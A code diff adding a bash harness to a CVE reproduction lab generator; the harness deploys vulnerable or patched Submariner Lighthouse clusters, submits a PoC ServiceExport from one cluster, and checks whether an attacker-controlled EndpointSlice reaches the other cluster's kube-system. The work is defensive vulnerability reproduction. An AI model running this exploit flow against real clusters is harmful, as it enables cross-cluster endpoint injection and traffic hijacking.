@@ -371,6 +371,121 @@ print(json.dumps(result, indent=2))
 PY
 '''
 
+LIGHTHOUSE_MANUAL_POC_SH = r'''#!/usr/bin/env bash
+set -euo pipefail
+
+LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
+WORK_ROOT="/tmp/cvelab-CVE-2026-66788-manual"
+STATE="$WORK_ROOT/active-variant"
+POC_FILE="$LAB_ROOT/artifacts/PoC.yaml"
+export PATH="$HOME/.local/bin:$PATH"
+
+active_variant() {
+  test -s "$STATE" || { echo "No manual lab is active. Run setup first." >&2; exit 2; }
+  cat "$STATE"
+}
+
+prepare_source() {
+  local variant="$1"
+  local work="$WORK_ROOT/$variant"
+  test ! -e "$STATE" || { echo "A manual lab is already active. Run cleanup first." >&2; exit 2; }
+  rm -rf "$work"
+  mkdir -p "$work"
+  cp -a "$LAB_ROOT/source/$variant/." "$work"
+  chown -R root:root "$work"
+  while IFS= read -r -d '' text_file; do
+    if grep -Iq $'\r' "$text_file"; then sed -i 's/\r$//' "$text_file"; fi
+  done < <(find "$work" -type f -print0)
+  cat > "$work/.shipyard.e2e.yml" <<'YAML'
+---
+submariner: true
+nodes: control-plane
+clusters:
+  cluster1:
+  cluster2:
+YAML
+  cd "$work"
+  git init -q
+  git config user.name cvelab
+  git config user.email cvelab@localhost
+  git add -A
+  git commit -qm "CVE manual PoC source snapshot"
+  make deploy USING=wireguard
+  mkdir -p "$WORK_ROOT"
+  printf '%s' "$variant" > "$STATE"
+  echo "Manual $variant lab is ready and will remain running."
+  echo "Next: run exploit, inspect PoC.yaml, then run verify."
+}
+
+kubectl_tool() {
+  local variant work
+  variant="$(active_variant)"
+  work="$WORK_ROOT/$variant"
+  docker run --rm --network kind \
+    -v "$work:/workspace:ro" -v "$LAB_ROOT:/lab:ro" \
+    --entrypoint /usr/sbin/kubectl "$variant:master" "$@"
+}
+
+exploit() {
+  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"
+  test -f "$POC_FILE" || { echo "Missing $POC_FILE" >&2; exit 2; }
+  kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
+  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
+    --for=condition=Valid serviceexport/cvelab --timeout=180s
+  kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
+  echo "Payload submitted from cluster2/cvelab-source. Run verify next."
+}
+
+verify() {
+  local variant k1 evidence
+  variant="$(active_variant)"
+  k1="/workspace/output/kubeconfigs/kind-config-cluster1"
+  evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
+    -l lighthouse.submariner.io/source-name=cvelab-exploit -o yaml)"
+  if grep -q '198.51.100.77' <<< "$evidence"; then
+    printf '%s\n' "$evidence"
+    if [[ "$variant" == "vulnerable" ]]; then
+      echo "REPRODUCED: attacker-controlled EndpointSlice reached cluster1/kube-system."
+      return 0
+    fi
+    echo "FAILED: patched variant propagated the payload." >&2
+    return 1
+  fi
+  if [[ "$variant" == "patched" ]]; then
+    echo "BLOCKED: no attacker-controlled EndpointSlice reached cluster1/kube-system."
+    return 0
+  fi
+  echo "NOT REPRODUCED: vulnerable variant did not propagate the payload." >&2
+  return 1
+}
+
+cleanup() {
+  if [[ -s "$STATE" ]]; then
+    local variant work
+    variant="$(cat "$STATE")"
+    work="$WORK_ROOT/$variant"
+    if [[ -d "$work" ]]; then (cd "$work" && make clean-clusters) || true; fi
+  fi
+  rm -rf "$WORK_ROOT"
+  echo "Manual lab removed."
+}
+
+action="${1:-}"
+case "$action" in
+  setup)
+    variant="${2:-vulnerable}"
+    [[ "$variant" == "vulnerable" || "$variant" == "patched" ]] || {
+      echo "Variant must be vulnerable or patched." >&2; exit 2;
+    }
+    prepare_source "$variant"
+    ;;
+  exploit) exploit ;;
+  verify) verify ;;
+  cleanup) cleanup ;;
+  *) echo "Usage: manual.sh {setup [vulnerable|patched]|exploit|verify|cleanup}" >&2; exit 2 ;;
+esac
+'''
+
 
 def _run_git(arguments: list[str], cwd: Path | None = None, binary: bool = False):
     git = shutil.which("git")
@@ -533,6 +648,7 @@ def _generate_curated_lighthouse(
     write_text(lab_dir / "validator" / "validator.py", LIGHTHOUSE_VALIDATOR_PY)
     write_text(lab_dir / "e2e" / "poc.yaml", LIGHTHOUSE_E2E_POC_YAML)
     write_text(lab_dir / "e2e" / "run.sh", LIGHTHOUSE_E2E_RUN_SH)
+    write_text(lab_dir / "e2e" / "manual.sh", LIGHTHOUSE_MANUAL_POC_SH)
     vulnerable_dockerfile = '''FROM golang:1.26 AS validation
 WORKDIR /src
 COPY source/vulnerable/ ./
